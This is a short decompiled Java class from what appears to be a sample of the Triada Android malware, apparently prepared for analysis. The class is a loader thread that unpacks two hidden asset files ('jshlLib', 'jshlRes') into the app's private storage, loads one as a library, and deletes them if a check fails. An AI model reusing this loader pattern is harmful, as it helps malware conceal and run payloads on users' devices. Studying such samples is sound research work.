package com.android.xb.start;

import android.content.Context;
import b.b;
import e.b;
import java.io.File;

final class start$2 extends Thread {
  start$2(Context paramContext) {}
  
  public void run() {
    if (start.access$000()) {
      b.c("Start is running!");
      return;
    } 
    start.access$002(true);
    start.a = this.a;
    File file = this.a.getFilesDir();
    b.a(this.a, "jshlLib", "jshlLib", false);
    b.a(this.a, "jshlRes", "jshlRes", false);
    b.a(file.getAbsolutePath() + File.separator + "jshlLib");
    if (!b.l(this.a)) {
      File file1 = new File(file.getAbsolutePath() + File.separator + "jshlLib");
      if (file1.exists())
        file1.delete(); 
      file = new File(file.getAbsolutePath() + File.separator + "jshlRes");
      if (file.exists())
        file.delete(); 
    } 
    start.access$002(false);
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/xb/start/start$2.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */